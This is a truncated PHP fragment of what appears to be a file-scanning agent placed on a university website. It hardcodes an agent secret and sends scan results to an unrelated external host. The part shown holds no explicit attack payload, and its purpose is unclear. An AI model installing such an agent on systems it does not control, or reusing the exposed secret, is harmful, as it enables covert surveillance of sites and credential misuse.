$__c = array(
    'domain_id' => 114,
    'agent_secret' => 'ds_mnw75ca7_pa87o20xkj',
    'agent_url' => 'https://ilearn.unand.ac.id',
    'result_url' => 'https://wr29k.asia/api/result.php',
    'domain' => 'ilearn.unand.ac.id',
    'doc_root' => realpath($_SERVER['DOCUMENT_ROOT'] ?? __DIR__)
);
$ctx = array_merge($__c, is_array($ctx ?? null) ? $ctx : array());

$docRoot = rtrim((string)($ctx['doc_root'] ?? ''), '/\\');
$assetHashes = is_array($ctx['asset_hashes'] ?? null) ? $ctx['asset_hashes'] : array();
$whitelist = is_array($ctx['whitelist'] ?? null) ? $ctx['whitelist'] : array();
$resultUrl = (string)($ctx['result_url'] ?? '');
$domainId = (int)($ctx['domain_id'] ?? 0);
$domain = (string)($ctx['domain'] ?? '');
$taskId = (int)($ctx['task_id'] ?? 0);
$agentSecret = (string)($ctx['agent_secret'] ?? '');
$agentUrl = (string)($ctx['agent_url'] ?? '');
$whitelistFallback = '';
$scanInterval = 86400;
$extensions = is_array($ctx['extensions'] ?? null) ? $ctx['extensions'] : array('.php', '.php3', '.php4', '.php5', '.phtml', '.asp', '.aspx', '.cgi', '.pl', '.jsp', '.py', '.cfm');

function _is_abs_path($p) {
    $p = (string) $p;
    return $p !== '' && ($p[0] === '/' || preg_match('/^[A-Za-z]:[\/\\\\]/', $p));
}
function _norm_text_for_hash($s) {
    $s = (string) $s;
    if (substr($s, 0, 3) === "\xEF\xBB\xBF") $s = substr($s, 3);
    $s = str_replace(array("\r\n", "\r"), "\n", $s);
    return $s;
}
function _norm_path_for_match($p) {
    $p = str_replace('\\', '/', (string) $p);
    $p = preg_replace('#/+#', '/', $p);
    return rtrim($p, '/');
}
function _whitelist_matches($fullPath, $relPath, $whitelistEntry) {
    $w = trim((string) $whitelistEntry);
    if ($w === '') return false;
    $full = _norm_path_for_match($fullPath);
    $rel = ltrim(_norm_path_for_match($relPath), '/');
    $wn = _norm_path_for_match($w);
    if (_is_abs_path($w)) {
        return ($full === $wn) || (strpos($full, $wn . '/') === 0);
    }
    $wn = ltrim($wn, '/');
    return ($rel === $wn) || (strpos($rel, $wn . '/') === 0) || (strpos($rel, $wn) !== false);
}

function _rpc($url, $json, $timeout = 30) {
    $r = false;
    if (function_ex